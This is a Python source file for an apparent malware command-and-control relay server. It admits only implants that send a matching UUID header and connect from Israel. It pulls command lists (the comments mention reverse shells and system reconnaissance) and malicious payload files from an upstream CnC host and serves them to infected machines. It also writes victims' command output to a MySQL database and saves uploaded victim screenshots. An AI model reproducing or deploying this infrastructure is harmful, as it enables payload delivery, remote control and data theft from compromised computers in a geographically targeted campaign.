from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json
import requests
from geolite2 import geolite2
import mysql.connector

#=====Vars for configuration for Server=====
#CnC Authentication
HEADERS = {'UUID':'UUID-02'}
geo = geolite2.reader()

hostName = "A" # Server IP or DNS
hostPort = 0 #443/80
UUID = '' # Client side Authentication
MaliciousPath = ''# Server path (url/path) for download the main file from CnC
Files=[] # List of files to download from the CnC
Commands=[] # List of commands from the CnC
Configuration = "" # Server path (url/path) for configuration the client
CnCAddress = '' # CnC Address - IP or DNS
CnCPort = 0 # CnC port (8080)
mydb = None # MySQL connection

scriptDir = os.getcwd() # Self directory folder
#==========================================


#===== Function for configuration the Server =====
# The server reads the configuration from the configuration.json file
def ConfigurationServer():
    with open('configuration.json') as f:
        confFileJson = json.load(f)

        global hostName
        global hostPort
        global UUID
        global MaliciousPath
        global CnCAddress
        global CnCPort

        hostName = confFileJson['Server']
        hostPort = confFileJson['Port']
        UUID = confFileJson['UUID']
        CnCAddress = confFileJson['CnCAddress']
        CnCPort = confFileJson['CnCPort']
        MaliciousPath = confFileJson['MaliciousPath']

    #SQL Connection
    with open('SQLconfiguration.json') as f:
        global mydb
        confFileJson = json.load(f)
        mydb = mysql.connector.connect(
          host=confFileJson['Server'],
          user=confFileJson['Username'],
          passwd=confFileJson['Password'],
          database="payload"
        )
    print("Connected to SQL: ", mydb)
#==========================================

# Function for downloading a file. Example: www.myserver.com/calc.exe will download calc.exe
def DownloadFile(url):
    #r = requests.Session()
    # NOTE the stream=True parameter
    try:
        r = requests.get(url, stream=True, headers=HEADERS)
        file = r.headers['Filename']
        with open(os.path.join(scriptDir,"MaliciousFiles",file), 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                        #f.flush() commented by recommendation from J.F.Sebastian
        return file
    except:
        None
    return None


# Returns the location of the IP address
def get_country(ip):
    try:
        x = geo.get(ip)
    except ValueError:
        return "None"
    try:
        return x['country']['names']['en'] if x else "None"
    except KeyError:
        return "None"

class MyServer(BaseHTTPRequestHandler):
    #GET Requests
    def do_GET(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID and get_country(self.client_address[0])=="Israel"):
            #print(get_country(str(self.client_address[0])))
            #Client asked for configuration
            if self.path.endswith("/Configuration"):
                global Commands
                global Configuration #This is the configuration for the client side
                Files = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetFiles' , headers=HEADERS).text)['Files'] # Request CnC for list of files
                print("Those are the files: ",Files)
                Commands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetCommands' , headers=HEADERS).text)['Commands'] # Request CnC for list of Commands
                DefaultCommands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetDefaultCommands' , headers=HEADERS).text)['DefaultCommands'] # Request CnC for list of default commands
                # Commands request a connection (For example, reverse command shell)
                # Regular Commands list are commands that the client exercute and send the response to the server (For example: ipconfig , systeminfo .etc)
                Configuration = {'Server': hostName, 'Commands':Commands,'DefaultCommands':DefaultCommands, 'Files':Files, 'MaliciousPath': MaliciousPath}
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(Configuration).encode())
                print(json.dumps(Configuration).encode())
                return

                # Client side requests for malicious main file
            if self.path.endswith(MaliciousPath):
                MaliciousFile = DownloadFile('http://'+CnCAddress+':'+str(CnCPort)+'/GetFile')

                self.send_response(200)
                self.send_header('Content-type', 'application/html')
                self.send_header('FileName', MaliciousFile)
                self.end_headers()
                with open(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile), 'rb') as file:
                    print(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                    self.wfile.write(file.read())
                    file.close()
                    #Remove comment to delete files on server side
                    #os.remove(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                return

    #POST Requests
    def do_POST(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID and get_country(self.client_address[0])=="Israel"):
            #Client send a new data about command
            if self.path.endswith("/Commands"):
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                self.send_response(200)
                self.end_headers()
                data = json.loads(self.data_string.decode('utf-8'))
                print('New Data recieved from ',self.client_address[0],data['computer'])
                # Write data localy:
                #with open(os.path.join(scriptDir, "CommandsData",data['computer']+".dat"), "ab+") as outfile:
                #    outfile.write((data['computer']+','+data['type']+','+data['data']).encode())
                #Write data to MySQL server:
                mycursor = mydb.cursor()
                sql = "INSERT INTO commandresults (computername, event, data) VALUES (%s, %s, %s)"
                val = ((data['computer'].encode()).decode("utf-8"),(data['type'].encode()).decode("utf-8"),(data['data'].encode()).decode("utf-8"))
                mycursor.execute(sql,val)
                mydb.commit()
                print(mycursor.rowcount, "record inserted.")

                self.wfile.write(("Done").encode())
                return

                # Client uploads a screenshop picture
            if self.path.endswith("/UploadPic"):
                #print('Got POST Command')
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                with open(str(self.client_address[0])+'.png', 'wb') as f:
                    f.write(self.data_string)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(("Done").encode())
                return

                #Clients requests for some malicious file. Server requests each file from the CnC
            if self.path.endswith("/GetAFile"):
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                File = DownloadFile('http://'+CnCAddress+':'+str(CnCPort)+'/GetAFile/'+(self.data_string).decode("utf-8"))

                self.send_response(200)
                self.send_header('Content-type', 'application/html')
                self.send_header('FileName', File)
                self.end_headers()
                print((self.data_string).decode("utf-8"))
                print((self.data_string).decode("utf-8"))
                with open(os.path.join(scriptDir,"MaliciousFiles",(self.data_string).decode("utf-8")), 'rb') as file:
                    #print(os.path.join(scriptDir,"MaliciousFiles",(self.data_string).decode("utf-8")))
                    self.wfile.write(file.read())
                    file.close()
                    #Remove comment to delete files on server side
                    #os.remove(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                return

ConfigurationServer()
myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
